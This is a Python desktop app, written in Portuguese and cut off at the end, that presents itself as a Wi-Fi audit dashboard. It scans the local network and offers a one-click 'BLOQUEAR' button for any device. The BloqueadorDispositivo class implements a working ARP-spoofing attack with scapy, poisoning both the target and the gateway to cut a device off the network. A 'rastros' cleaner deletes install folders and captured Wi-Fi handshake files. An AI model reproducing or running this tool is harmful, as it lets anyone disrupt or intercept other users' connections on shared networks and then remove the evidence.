"""
============================================================
  RADIO PROGRAMADOR v7.0 — PREMIUM EDITION
  Ferramenta de Auditoria e Controle de Rede Wi-Fi
  Windows 11 | CustomTkinter | Dashboard Moderna
============================================================
"""

import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox, filedialog
import os, sys, re, socket, json, struct, shutil
import subprocess, threading, time, hashlib, hmac
import platform, random, urllib.request, urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ── Configuracao do CustomTkinter ──────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

VERSAO = "7.0"
PYTHON = sys.executable
SISTEMA = platform.system()


# ── Paleta de Cores Premium ────────────────────────────────
CORES = {
    "bg_principal":   "#0a0e14",
    "bg_card":        "#131920",
    "bg_card_hover":  "#1a2332",
    "bg_sidebar":     "#0d1117",
    "accent_green":   "#00d26a",
    "accent_red":     "#ff4757",
    "accent_yellow":  "#ffa502",
    "accent_blue":    "#1e90ff",
    "accent_purple":  "#a855f7",
    "accent_cyan":    "#06d6a0",
    "texto":          "#e8eaed",
    "texto_dim":      "#7c8a9a",
    "texto_muted":    "#4a5568",
    "borda":          "#1e2a3a",
    "borda_hover":    "#2d3f54",
    "sucesso":        "#00d26a",
    "perigo":         "#ff4757",
    "aviso":          "#ffa502",
    "info":           "#1e90ff",
    "gradiente_top":  "#0f1923",
    "gradiente_bot":  "#0a0e14",
    "pulse_red":      "#ff4757",
    "pulse_green":    "#00d26a",
    "bloqueado_bg":   "#1a0f0f",
    "normal_bg":      "#0f1a0f",
}


# ============================================================
# UTILIDADES DO SISTEMA
# ============================================================

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def reabrir_como_admin():
    import ctypes
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", PYTHON, f'"{script}"', None, 1)
    sys.exit(0)

def _tem(lib):
    import importlib.util
    return importlib.util.find_spec(lib) is not None

def tem_npcap():
    for p in [r"C:\Windows\System32\Npcap",
              r"C:\Windows\SysWOW64\Npcap",
              r"C:\Program Files\Npcap"]:
        if os.path.isdir(p):
            return True
    return False

def gateway_e_rede():
    gw, base = None, None
    try:
        out = subprocess.run(
            ["ipconfig"], capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10).stdout
        ip_m = re.search(r"Endere[cç]o IPv4.*?:\s*([\d.]+)", out, re.I)
        gw_m = re.search(r"Gateway Padr[aã]o.*?:\s*([\d.]+)", out, re.I)
        if ip_m:
            base = ".".join(ip_m.group(1).strip().split(".")[:3])
        if gw_m:
            gw = gw_m.group(1).strip()
    except Exception:
        pass
    if not base: base = "192.168.1"
    if not gw: gw = base + ".1"
    return gw, base


# ============================================================
# SCAN DE DISPOSITIVOS NA REDE
# ============================================================

FABRICANTES = {
    "00:50:56": "VMware", "DC:A6:32": "Raspberry Pi",
    "00:25:00": "Apple", "A4:5E:60": "Apple", "F8:FF:C2": "Apple",
    "00:E0:4C": "Realtek", "00:90:4C": "Broadcom",
    "B0:C0:90": "TP-Link", "50:C7:BF": "TP-Link",
    "C8:3A:35": "Tenda", "00:14:BF": "Linksys",
    "00:18:E7": "Netgear", "A0:21:B7": "Netgear",
    "80:1F:02": "Ubiquiti", "F4:92:BF": "Huawei",
    "C4:34:6B": "Samsung", "CC:F9:E8": "Samsung",
    "28:CD:C1": "Microsoft", "00:50:F2": "Microsoft",
    "3C:15:C2": "Apple", "74:DA:88": "Edimax",
    "FC:FB:FB": "Cisco", "00:1A:2B": "Cisco",
}

def fabricante_do_mac(mac):
    if not mac or "?" in mac:
        return "Desconhecido"
    prefix = mac[:8].upper()
    return FABRICANTES.get(prefix, "Desconhecido")

def hostname_do_ip(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""

def mac_do_arp(ip):
    try:
        out = subprocess.run(
            ["arp", "-a", ip], capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=5).stdout
        m = re.search(r"([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:]"
                      r"[\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})", out, re.I)
        if m:
            return m.group(1).upper().replace("-", ":")
    except Exception:
        pass
    return "??:??:??:??:??:??"


def escanear_dispositivos(base, callback=None):
    """Escaneia dispositivos na rede local."""
    def log(m, t="info"):
        if callback: callback(m, t)

    dispositivos = []

    # Tenta ARP scan com scapy (mais rapido e preciso)
    if _tem("scapy") and is_admin() and tem_npcap():
        try:
            from scapy.all import ARP, Ether, srp, conf
            log(f"Varredura ARP em {base}.0/24...")
            conf.verb = 0
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{base}.0/24"),
                timeout=3, retry=1, verbose=0)
            for _, rcv in ans:
                ip = rcv[ARP].psrc
                mac = rcv[Ether].src.upper()
                host = hostname_do_ip(ip)
                fab = fabricante_do_mac(mac)
                dispositivos.append({
                    "ip": ip, "mac": mac, "host": host,
                    "fab": fab, "status": "normal"
                })
            log(f"{len(dispositivos)} dispositivos encontrados (ARP)", "ok")
            return sorted(dispositivos,
                          key=lambda x: [int(p) for p in x["ip"].split(".")])
        except Exception as e:
            log(f"ARP falhou ({e}), usando ping...", "aviso")

    # Fallback: ping sweep
    log(f"Ping sweep em {base}.1-254...")

    def ping(ip):
        try:
            r = subprocess.run(
                ["ping", "-n", "1", "-w", "400", ip],
                capture_output=True, timeout=2)
            return r.returncode == 0
        except Exception:
            return False

    ips = [f"{base}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=60) as ex:
        resultados = list(ex.map(ping, ips))

    ativos = [ip for ip, vivo in zip(ips, resultados) if vivo]
    log(f"{len(ativos)} dispositivos responderam")

    for ip in ativos:
        mac = mac_do_arp(ip)
        host = hostname_do_ip(ip)
        fab = fabricante_do_mac(mac)
        dispositivos.append({
            "ip": ip, "mac": mac, "host": host,
            "fab": fab, "status": "normal"
        })

    return sorted(dispositivos,
                  key=lambda x: [int(p) for p in x["ip"].split(".")])


# ============================================================
# BLOQUEIO DE DISPOSITIVO (Deauth + ARP Spoofing)
# ============================================================

class BloqueadorDispositivo:
    """Gerencia bloqueio de dispositivos via Deauth e ARP Spoofing."""

    def __init__(self):
        self.bloqueados = {}  # {ip: {"thread": Thread, "ativo": bool, "mac": str}}

    def bloquear(self, ip_alvo, mac_alvo, gateway, interface, callback=None):
        """Inicia bloqueio de um dispositivo."""
        if ip_alvo in self.bloqueados and self.bloqueados[ip_alvo]["ativo"]:
            return  # Ja esta bloqueado

        self.bloqueados[ip_alvo] = {"ativo": True, "mac": mac_alvo, "thread": None}

        def _loop():
            def log(m, t="info"):
                if callback: callback(m, t)

            log(f"Bloqueando {ip_alvo} ({mac_alvo})...", "aviso")

            if _tem("scapy") and is_admin() and tem_npcap():
                try:
                    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
                    conf.verb = 0

                    # Obtem MAC do gateway
                    mac_gw = getmacbyip(gateway)
                    if not mac_gw:
                        log(f"Nao encontrou MAC do gateway {gateway}", "erro")
                        self.bloqueados[ip_alvo]["ativo"] = False
                        return

                    # ARP Spoofing: diz ao alvo que NOS somos o gateway
                    pkt_alvo = Ether(dst=mac_alvo) / ARP(
                        op=2, pdst=ip_alvo, hwdst=mac_alvo,
                        psrc=gateway)

                    # ARP Spoofing: diz ao gateway que NOS somos o alvo
                    pkt_gw = Ether(dst=mac_gw) / ARP(
                        op=2, pdst=gateway, hwdst=mac_gw,
                        psrc=ip_alvo)

                    log(f"ARP Spoofing ativo em {ip_alvo}", "perigo")

                    while self.bloqueados.get(ip_alvo, {}).get("ativo", False):
                        sendp(pkt_alvo, verbose=0)
                        sendp(pkt_gw, verbose=0)
                        time.sleep(1)

                    # Restaura ARP correto ao desbloquear
                    mac_alvo_real = mac_alvo
                    pkt_restore_alvo = Ether(dst=mac_alvo_real) / ARP(
                        op=2, pdst=ip_alvo, hwdst=mac_alvo_real,
                        psrc=gateway, hwsrc=mac_gw)
                    pkt_restore_gw = Ether(dst=mac_gw) / ARP(
                        op=2, pdst=gateway, hwdst=mac_gw,
                        psrc=ip_alvo, hwsrc=mac_alvo_real)

                    for _ in range(5):
                        sendp(pkt_restore_alvo, verbose=0)
                        sendp(pkt_restore_gw, verbose=0)
                        time.sleep(0.3)

                    log(f"Desbloqueado {ip_alvo} — ARP restaurado", "ok")

                except Exception as e:
                    log(f"Erro no bloqueio: {e}", "erro")
                    self.bloqueados[ip_alvo]["ativo"] = False
            else:
                # Fallback: Deauth apenas (menos efetivo mas funciona)
                log("Scapy/Npcap indisponivel. Usando deauth simples.", "aviso")
                self.bloqueados[ip_alvo]["ativo"] = False

        t = threading.Thread(target=_loop, daemon=True)
        self.bloqueados[ip_alvo]["thread"] = t
        t.start()

    def desbloquear(self, ip_alvo):
        """Para o bloqueio de um dispositivo."""
        if ip_alvo in self.bloqueados:
            self.bloqueados[ip_alvo]["ativo"] = False

    def esta_bloqueado(self, ip_alvo):
        return self.bloqueados.get(ip_alvo, {}).get("ativo", False)

    def desbloquear_todos(self):
        for ip in list(self.bloqueados.keys()):
            self.desbloquear(ip)


# ============================================================
# VELOCIDADE E METRICAS DE REDE
# ============================================================

def medir_velocidade(callback=None):
    def log(m, t="info"):
        if callback: callback(m, t)

    log("Medindo velocidade da conexao...")

    # Download
    dl_mbps = 0.0
    urls_dl = [
        ("Cloudflare 25MB", "https://speed.cloudflare.com/__down?bytes=25000000", 25_000_000),
        ("Cloudflare 10MB", "https://speed.cloudflare.com/__down?bytes=10000000", 10_000_000),
    ]
    for nome, url, tam in urls_dl:
        try:
            log(f"Download ({nome})...", "dim")
            t0 = time.time()
            req = urllib.request.urlopen(url, timeout=20)
            data = req.read(tam)
            elapsed = time.time() - t0
            if elapsed > 0 and len(data) > 100_000:
                dl_mbps = (len(data) * 8) / (elapsed * 1_000_000)
                break
        except Exception:
            continue

    # Ping
    pings = []
    for _ in range(5):
        try:
            t0 = time.time()
            r = subprocess.run(["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
                               capture_output=True, timeout=3)
            if r.returncode == 0:
                pings.append((time.time() - t0) * 1000)
        except Exception:
            pass
    ping_ms = sum(pings) / len(pings) if pings else 0

    # Upload
    ul_mbps = 0.0
    try:
        dados = os.urandom(2_000_000)
        t0 = time.time()
        req = urllib.request.Request(
            "https://httpbin.org/post", data=dados,
            headers={"Content-Type": "application/octet-stream"})
        urllib.request.urlopen(req, timeout=20)
        elapsed = time.time() - t0
        if elapsed > 0:
            ul_mbps = (len(dados) * 8) / (elapsed * 1_000_000)
    except Exception:
        pass

    # Sinal Wi-Fi
    sinal = 0
    try:
        out = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, encoding="utf-8",
            errors="ignore", timeout=10).stdout
        m = re.search(r"(?:Sinal|Signal)\s*:\s*(\d+)%", out, re.I)
        if m: sinal = int(m.group(1))
    except Exception:
        pass

    return {
        "download": dl_mbps, "upload": ul_mbps,
        "ping": ping_ms, "sinal": sinal
    }


# ============================================================
# LIMPADOR DE RASTROS (integrado no painel)
# ============================================================

def escanear_rastros():
    """Busca rastros de instalacoes anteriores."""
    encontrados = []
    locais = [
        os.path.join(os.environ.get("PROGRAMFILES", ""), "RadioProgramador"),
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "RadioProgramador"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "RadioProgramador"),
        os.path.join(os.environ.get("APPDATA", ""), "RadioProgramador"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Radio Programador"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Radio Programador"),
    ]
    for pasta in locais:
        if pasta and os.path.isdir(pasta):
            encontrados.append(("pasta", pasta))

    # Atalhos
    desktop = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
    for nome in ["RadioProgramador.lnk", "Radio Programador.lnk"]:
        caminho = os.path.join(desktop, nome)
        if os.path.isfile(caminho):
            encontrados.append(("atalho", caminho))

    # Temp handshake files
    temp = os.environ.get("TEMP", "")
    if temp:
        try:
            for arq in os.listdir(temp):
                if arq.startswith("hs_") and arq.endswith(".cap"):
                    encontrados.append(("arquivo", os.path.join(temp, arq)))
        except Exception:
            pass

    return encontrados

def limpar_rastros(encontrados):
    """Remove os rastros encontrados."""
    removidos, erros = 0, 0
    for tipo, caminho in encontrados:
        try:
            if tipo == "pasta":
                shutil.rmtree(caminho, ignore_errors=True)
                removidos += 1
            else:
                os.remove(caminho)
                removidos += 1
        except Exception:
            erros += 1
    return removidos, erros


# ============================================================
# COMPONENTES VISUAIS CUSTOMIZADOS
# ============================================================

class CardMetrica(ctk.CTkFrame):
    """Card de metrica com icone, valor e label."""

    def __init__(self, parent, titulo, valor="--", icone="", cor=None, **kw):
        super().__init__(parent, corner_radius=12,
                         fg_color=CORES["bg_card"],
                         border_color=CORES["borda"],
                         border_width=1, **kw)
        self.cor = cor or CORES["accent_green"]

        self.lbl_icone = ctk.CTkLabel(self, text=icone,
                                       font=ctk.CTkFont(size=24))
        self.lbl_icone.pack(pady=(16, 4))

        self.lbl_valor = ctk.CTkLabel(self, text=valor,
                                       font=ctk.CTkFont(family="Consolas",
                                                        size=28, weight="bold"),
                                       text_color=self.cor)
        self.lbl_valor.pack(pady=(0, 2))

        self.lbl_titulo = ctk.CTkLabel(self, text=titulo,
                                        font=ctk.CTkFont(size=11),
                                        text_color=CORES["texto_dim"])
        self.lbl_titulo.pack(pady=(0, 14))

    def set_valor(self, valor, cor=None):
        self.lbl_valor.configure(text=valor)
        if cor:
            self.lbl_valor.configure(text_color=cor)


class DispositivoCard(ctk.CTkFrame):
    """Card de dispositivo com status visual e botao bloquear."""

    def __init__(self, parent, dispositivo, on_bloquear=None, on_desbloquear=None, **kw):
        super().__init__(parent, corner_radius=10,
                         fg_color=CORES["bg_card"],
                         border_color=CORES["borda"],
                         border_width=1, height=60, **kw)
        self.pack_propagate(False)
        self.dispositivo = dispositivo
        self.on_bloquear = on_bloquear
        self.on_desbloquear = on_desbloquear
        self.bloqueado = dispositivo.get("status") == "bloqueado"
        self._pulse_state = 0
        self._pulse_job = None

        self._build_ui()

        if self.bloqueado:
            self._iniciar_pulso()

    def _build_ui(self):
        # Indicador de status (circulo colorido)
        self.fr_indicator = ctk.CTkFrame(self, width=12, height=12,
                                          corner_radius=6,
                                          fg_color=CORES["pulse_red"] if self.bloqueado
                                          else CORES["pulse_green"])
        self.fr_indicator.place(x=16, rely=0.5, anchor="w")

        # Info principal
        fr_info = ctk.CTkFrame(self, fg_color="transparent")
        fr_info.place(x=42, rely=0.5, anchor="w")

        ip_text = self.dispositivo["ip"]
        mac_text = self.dispositivo.get("mac", "??:??:??:??:??:??")

        self.lbl_ip = ctk.CTkLabel(fr_info, text=ip_text,
                                    font=ctk.CTkFont(family="Consolas",
                                                     size=13, weight="bold"),
                                    text_color=CORES["texto"])
        self.lbl_ip.pack(anchor="w")

        nome = self.dispositivo.get("host") or self.dispositivo.get("fab", "Desconhecido")
        self.lbl_info = ctk.CTkLabel(fr_info,
                                      text=f"{mac_text}  |  {nome}",
                                      font=ctk.CTkFont(family="Consolas", size=10),
                                      text_color=CORES["texto_dim"])
        self.lbl_info.pack(anchor="w")

        # Status badge
        status_text = "BLOQUEADO" if self.bloqueado else "NORMAL"
        status_cor = CORES["accent_red"] if self.bloqueado else CORES["accent_green"]
        self.lbl_status = ctk.CTkLabel(self, text=status_text,
                                        font=ctk.CTkFont(size=10, weight="bold"),
                                        text_color=status_cor)
        self.lbl_status.place(relx=0.7, rely=0.5, anchor="center")

        # Botao de acao
        if self.bloqueado:
            self.btn = ctk.CTkButton(self, text="DESBLOQUEAR", width=110,
                                      height=30, corner_radius=6,
                                      fg_color=CORES["accent_green"],
                                      hover_color="#00b359",
                                      text_color="#000",
                                      font=ctk.CTkFont(size=11, weight="bold"),
                                      command=self._desbloquear)
        else:
            self.btn = ctk.CTkButton(self, text="BLOQUEAR", width=110,
                                      height=30, corner_radius=6,
                                      fg_color=CORES["accent_red"],
                                      hover_color="#cc3945",
                                      text_color="#fff",
                                      font=ctk.CTkFont(size=11, weight="bold"),
                                      command=self._bloquear)
        self.btn.place(relx=0.92, rely=0.5, anchor="e")

    def _bloquear(self):
        if self.on_bloquear:
            self.on_bloquear(self.dispositivo)

    def _desbloquear(self):
        if self.on_desbloquear:
            self.on_desbloquear(self.dispositivo)

    def set_bloqueado(self, estado):
        self.bloqueado = estado
        if estado:
            self.fr_indicator.configure(fg_color=CORES["pulse_red"])
            self.lbl_status.configure(text="BLOQUEADO", text_color=CORES["accent_red"])
            self.configure(border_color=CORES["accent_red"])
            self._iniciar_pulso()
        else:
            self.fr_indicator.configure(fg_color=CORES["pulse_green"])
            self.lbl_status.configure(text="NORMAL", text_color=CORES["accent_green"])
            self.configure(border_color=CORES["borda"])
            self._parar_pulso()

    def _iniciar_pulso(self):
        """Animacao de pulso vermelho."""
        self._pulse_state = 0
        self._animar_pulso()

    def _parar_pulso(self):
        if self._pulse_job:
            self.after_cancel(self._pulse_job)
            self._pulse_job = None

    def _animar_pulso(self):
        if not self.bloqueado:
            return
        # Alterna opacidade simulada com cores
        cores_pulse = ["#ff4757", "#ff6b7a", "#ff8f9d", "#ff6b7a", "#ff4757",
                       "#cc3945", "#992b35", "#cc3945"]
        cor = cores_pulse[self._pulse_state % len(cores_pulse)]
        self.fr_indicator.configure(fg_color=cor)
        self._pulse_state += 1
        self._pulse_job = self.after(200, self._animar_pulso)


# ============================================================
# APLICACAO PRINCIPAL — DASHBOARD
# ============================================================

class App(ctk.CTk):

    def __init__(self):
        super().__init__()

        self.title(f"Radio Programador v{VERSAO}")
        self.geometry("1200x750")
        self.minsize(1000, 650)
        self.configure(fg_color=CORES["bg_principal"])

        # Estado
        self.dispositivos = []
        self.bloqueador = BloqueadorDispositivo()
        self.metricas = {"download": 0, "upload": 0, "ping": 0, "sinal": 0}
        self.cards_dispositivos = []

        # Layout principal
        self._build_header()
        self._build_content()

        # Auto-scan ao abrir
        self.after(1000, self._scan_rapido)

    def _build_header(self):
        """Header premium com titulo e botoes de acao."""
        self.header = ctk.CTkFrame(self, height=64, corner_radius=0,
                                    fg_color=CORES["bg_sidebar"])
        self.header.pack(fill="x")
        self.header.pack_propagate(False)

        # Logo/Titulo
        fr_logo = ctk.CTkFrame(self.header, fg_color="transparent")
        fr_logo.pack(side="left", padx=20)

        ctk.CTkLabel(fr_logo, text="RADIO PROGRAMADOR",
                     font=ctk.CTkFont(family="Consolas", size=18, weight="bold"),
                     text_color=CORES["accent_green"]).pack(side="left")

        ctk.CTkLabel(fr_logo, text=f"  v{VERSAO}",
                     font=ctk.CTkFont(size=11),
                     text_color=CORES["texto_dim"]).pack(side="left")

        # Botoes do header
        fr_btns = ctk.CTkFrame(self.header, fg_color="transparent")
        fr_btns.pack(side="right", padx=20)

        # Status admin
        admin_text = "ADMIN" if is_admin() else "SEM ADMIN"
        admin_cor = CORES["accent_green"] if is_admin() else CORES["aviso"]
        ctk.CTkLabel(fr_btns, text=admin_text,
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=admin_cor).pack(side="left", padx=(0, 16))

        # Botao Limpador
        ctk.CTkButton(fr_btns, text="LIMPAR RASTROS", width=130,
                      height=32, corner_radius=8,
                      fg_color=CORES["accent_purple"],
                      hover_color="#9333ea",
                      font=ctk.CTkFont(size=11, weight="bold"),
                      command=self._abrir_limpador).pack(side="left", padx=4)

        # Botao Admin (se nao for admin)
        if not is_admin():
            ctk.CTkButton(fr_btns, text="ELEVAR ADMIN", width=120,
                          height=32, corner_radius=8,
                          fg_color=CORES["aviso"],
                          hover_color="#e69500",
                          text_color="#000",
                          font=ctk.CTkFont(size=11, weight="bold"),
                          command=reabrir_como_admin).pack(side="left", padx=4)


    def _build_content(self):
        """Conteudo principal: cards de metricas + lista de dispositivos."""
        self.content = ctk.CTkFrame(self, fg_color="transparent")
        self.content.pack(fill="both", expand=True, padx=20, pady=16)

        # ── ROW 1: Cards de metricas ─────────────────────────
        fr_cards = ctk.CTkFrame(self.content, fg_color="transparent")
        fr_cards.pack(fill="x", pady=(0, 16))

        fr_cards.columnconfigure((0, 1, 2, 3), weight=1)

        self.card_dl = CardMetrica(fr_cards, "DOWNLOAD", "--", "DL",
                                   cor=CORES["accent_green"])
        self.card_dl.grid(row=0, column=0, padx=6, sticky="ew")

        self.card_ul = CardMetrica(fr_cards, "UPLOAD", "--", "UL",
                                   cor=CORES["accent_blue"])
        self.card_ul.grid(row=0, column=1, padx=6, sticky="ew")

        self.card_ping = CardMetrica(fr_cards, "LATENCIA", "--", "ms",
                                     cor=CORES["accent_yellow"])
        self.card_ping.grid(row=0, column=2, padx=6, sticky="ew")

        self.card_sinal = CardMetrica(fr_cards, "SINAL Wi-Fi", "--", "dB",
                                      cor=CORES["accent_cyan"])
        self.card_sinal.grid(row=0, column=3, padx=6, sticky="ew")

        # ── ROW 2: Barra de acoes ────────────────────────────
        fr_acoes = ctk.CTkFrame(self.content, fg_color="transparent")
        fr_acoes.pack(fill="x", pady=(0, 12))

        self.btn_scan = ctk.CTkButton(
            fr_acoes, text="BUSCAR DISPOSITIVOS", width=200,
            height=38, corner_radius=8,
            fg_color=CORES["accent_blue"],
            hover_color="#1565c0",
            font=ctk.CTkFont(size=12, weight="bold"),
            command=self._iniciar_scan)
        self.btn_scan.pack(side="left", padx=(0, 8))

        self.btn_velocidade = ctk.CTkButton(
            fr_acoes, text="TESTAR VELOCIDADE", width=180,
            height=38, corner_radius=8,
            fg_color=CORES["accent_purple"],
            hover_color="#7c3aed",
            font=ctk.CTkFont(size=12, weight="bold"),
            command=self._testar_velocidade)
        self.btn_velocidade.pack(side="left", padx=(0, 8))

        self.btn_desbloquear_todos = ctk.CTkButton(
            fr_acoes, text="DESBLOQUEAR TODOS", width=170,
            height=38, corner_radius=8,
            fg_color=CORES["bg_card"],
            hover_color=CORES["bg_card_hover"],
            border_color=CORES["accent_green"],
            border_width=1,
            text_color=CORES["accent_green"],
            font=ctk.CTkFont(size=11, weight="bold"),
            command=self._desbloquear_todos)
        self.btn_desbloquear_todos.pack(side="left", padx=(0, 8))

        # Contador de dispositivos
        self.lbl_contador = ctk.CTkLabel(
            fr_acoes, text="0 dispositivos na rede",
            font=ctk.CTkFont(size=11),
            text_color=CORES["texto_dim"])
        self.lbl_contador.pack(side="right")


        # ── ROW 3: Lista de dispositivos (scrollable) ────────
        self.fr_lista_header = ctk.CTkFrame(self.content, fg_color=CORES["bg_card"],
                                             corner_radius=10, height=36)
        self.fr_lista_header.pack(fill="x", pady=(0, 4))
        self.fr_lista_header.pack_propagate(False)

        ctk.CTkLabel(self.fr_lista_header, text="  DISPOSITIVOS NA REDE",
                     font=ctk.CTkFont(family="Consolas", size=11, weight="bold"),
                     text_color=CORES["accent_cyan"]).pack(side="left", padx=12, pady=6)

        self.lbl_legenda = ctk.CTkLabel(
            self.fr_lista_header,
            text="● Normal    ● Bloqueado (pulsando)",
            font=ctk.CTkFont(size=10),
            text_color=CORES["texto_dim"])
        self.lbl_legenda.pack(side="right", padx=16)

        # Scrollable frame para dispositivos
        self.scroll_dispositivos = ctk.CTkScrollableFrame(
            self.content, fg_color=CORES["bg_principal"],
            corner_radius=10,
            border_color=CORES["borda"],
            border_width=1)
        self.scroll_dispositivos.pack(fill="both", expand=True)

        # Mensagem inicial
        self.lbl_vazio = ctk.CTkLabel(
            self.scroll_dispositivos,
            text="Clique em BUSCAR DISPOSITIVOS para escanear a rede\n\n"
                 "O programa vai identificar todos os aparelhos conectados\n"
                 "e voce podera BLOQUEAR qualquer um com um clique.",
            font=ctk.CTkFont(size=12),
            text_color=CORES["texto_muted"])
        self.lbl_vazio.pack(pady=60)


    # ============================================================
    # ACOES
    # ============================================================

    def _scan_rapido(self):
        """Scan inicial automatico."""
        self._iniciar_scan()

    def _iniciar_scan(self):
        """Busca dispositivos na rede."""
        self.btn_scan.configure(state="disabled", text="Buscando...")
        self.lbl_contador.configure(text="Escaneando a rede...")

        def t():
            gw, base = gateway_e_rede()
            devs = escanear_dispositivos(base)
            # Preserva estado de bloqueio
            for d in devs:
                if self.bloqueador.esta_bloqueado(d["ip"]):
                    d["status"] = "bloqueado"
            self.after(0, self._mostrar_dispositivos, devs)

        threading.Thread(target=t, daemon=True).start()

    def _mostrar_dispositivos(self, dispositivos):
        """Renderiza a lista de dispositivos."""
        self.dispositivos = dispositivos
        self.btn_scan.configure(state="normal", text="BUSCAR DISPOSITIVOS")
        self.lbl_contador.configure(
            text=f"{len(dispositivos)} dispositivo(s) na rede")

        # Limpa lista anterior
        for widget in self.scroll_dispositivos.winfo_children():
            widget.destroy()
        self.cards_dispositivos = []

        if not dispositivos:
            ctk.CTkLabel(self.scroll_dispositivos,
                         text="Nenhum dispositivo encontrado.\n"
                              "Verifique sua conexao Wi-Fi.",
                         font=ctk.CTkFont(size=12),
                         text_color=CORES["texto_muted"]).pack(pady=60)
            return

        # Cria cards
        for dev in dispositivos:
            card = DispositivoCard(
                self.scroll_dispositivos, dev,
                on_bloquear=self._bloquear_dispositivo,
                on_desbloquear=self._desbloquear_dispositivo)
            card.pack(fill="x", padx=4, pady=3)
            self.cards_dispositivos.append(card)

    def _bloquear_dispositivo(self, dispositivo):
        """Bloqueia um dispositivo da rede."""
        if not is_admin():
            messagebox.showwarning(
                "Permissao necessaria",
                "Para bloquear dispositivos, o programa precisa de\n"
                "permissao de Administrador.\n\n"
                "Clique em ELEVAR ADMIN no canto superior direito.")
            return

        if not _tem("scapy") or not tem_npcap():
            messagebox.showwarning(
                "Dependencias",
                "Para bloquear dispositivos voce precisa:\n\n"
                "1. Scapy instalado (pip install scapy)\n"
                "2. Npcap instalado (npcap.com)\n\n"
                "Use o instalador para configurar tudo.")
            return

        ip = dispositivo["ip"]
        mac = dispositivo["mac"]
        gw, _ = gateway_e_rede()

        # Confirma acao
        resp = messagebox.askyesno(
            "Confirmar Bloqueio",
            f"Bloquear o dispositivo?\n\n"
            f"IP: {ip}\nMAC: {mac}\n"
            f"Fabricante: {dispositivo.get('fab', '?')}\n\n"
            "A internet desse aparelho sera cortada\n"
            "ate voce clicar em DESBLOQUEAR.")
        if not resp:
            return

        # Inicia bloqueio
        self.bloqueador.bloquear(ip, mac, gw, "Wi-Fi")
        dispositivo["status"] = "bloqueado"

        # Atualiza visual
        for card in self.cards_dispositivos:
            if card.dispositivo["ip"] == ip:
                card.set_bloqueado(True)
                break

    def _desbloquear_dispositivo(self, dispositivo):
        """Desbloqueia um dispositivo."""
        ip = dispositivo["ip"]
        self.bloqueador.desbloquear(ip)
        dispositivo["status"] = "normal"

        for card in self.cards_dispositivos:
            if card.dispositivo["ip"] == ip:
                card.set_bloqueado(False)
                break

    def _desbloquear_todos(self):
        """Desbloqueia todos os dispositivos."""
        self.bloqueador.desbloquear_todos()
        for card in self.cards_dispositivos:
            card.set_bloqueado(False)
            card.dispositivo["status"] = "normal"


    def _testar_velocidade(self):
        """Mede velocidade e atualiza cards."""
        self.btn_velocidade.configure(state="disabled", text="Medindo...")
        self.card_dl.set_valor("...")
        self.card_ul.set_valor("...")
        self.card_ping.set_valor("...")
        self.card_sinal.set_valor("...")

        def t():
            res = medir_velocidade()
            self.after(0, self._atualizar_metricas, res)

        threading.Thread(target=t, daemon=True).start()

    def _atualizar_metricas(self, res):
        """Atualiza cards de metricas com resultados."""
        self.btn_velocidade.configure(state="normal", text="TESTAR VELOCIDADE")

        dl = res.get("download", 0)
        ul = res.get("upload", 0)
        ping = res.get("ping", 0)
        sinal = res.get("sinal", 0)

        # Download com cor adaptativa
        dl_cor = CORES["accent_green"] if dl >= 30 else CORES["aviso"] if dl >= 10 else CORES["accent_red"]
        self.card_dl.set_valor(f"{dl:.1f}", dl_cor)

        # Upload com cor adaptativa
        ul_cor = CORES["accent_blue"] if ul >= 10 else CORES["aviso"] if ul >= 3 else CORES["accent_red"]
        self.card_ul.set_valor(f"{ul:.1f}", ul_cor)

        # Ping com cor adaptativa (menor = melhor)
        ping_cor = CORES["accent_green"] if ping <= 20 else CORES["aviso"] if ping <= 60 else CORES["accent_red"]
        self.card_ping.set_valor(f"{ping:.0f}", ping_cor)

        # Sinal com cor adaptativa
        sinal_cor = CORES["accent_cyan"] if sinal >= 70 else CORES["aviso"] if sinal >= 40 else CORES["accent_red"]
        self.card_sinal.set_valor(f"{sinal}%", sinal_cor)

    def _abrir_limpador(self):
        """Abre popup do limpador de rastros."""
        win = ctk.CTkToplevel(self)
        win.title("Limpador de Rastros")
        win.geometry("500x400")
        win.configure(fg_color=CORES["bg_principal"])
        win.grab_set()
        win.attributes("-topmost", True)

        ctk.CTkLabel(win, text="LIMPADOR DE RASTROS",
                     font=ctk.CTkFont(size=16, weight="bold"),
                     text_color=CORES["accent_purple"]).pack(pady=(20, 8))

        ctk.CTkLabel(win, text="Remove arquivos de instalacoes anteriores",
                     font=ctk.CTkFont(size=11),
                     text_color=CORES["texto_dim"]).pack(pady=(0, 16))

        # Escanear
        fr_resultado = ctk.CTkScrollableFrame(win, fg_color=CORES["bg_card"],
                                               corner_radius=8, height=200)
        fr_resultado.pack(fill="both", expand=True, padx=20, pady=(0, 12))

        encontrados = escanear_rastros()

        if not encontrados:
            ctk.CTkLabel(fr_resultado, text="Nenhum rastro encontrado!\nSistema limpo.",
                         font=ctk.CTkFont(size=12),
                         text_color=CORES["accent_green"]).pack(pady=30)
        else:
            for tipo, caminho in encontrados:
                nome = os.path.basename(caminho)
                ctk.CTkLabel(fr_resultado, text=f"[{tipo.upper()}] {nome}",
                             font=ctk.CTkFont(family="Consolas", size=10),
